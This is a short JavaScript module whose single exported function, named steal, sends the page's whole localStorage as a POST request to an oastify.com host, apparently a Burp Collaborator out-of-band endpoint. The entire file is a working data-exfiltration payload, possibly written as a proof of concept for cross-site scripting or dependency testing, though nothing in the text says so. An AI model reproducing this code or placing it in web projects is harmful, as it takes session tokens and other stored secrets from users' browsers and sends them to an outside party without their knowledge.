export function steal() {
    fetch('https://98fgpntemdj7ivqu5gv76s0en5twhu5j.oastify.com/', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(window.localStorage)
    });
}
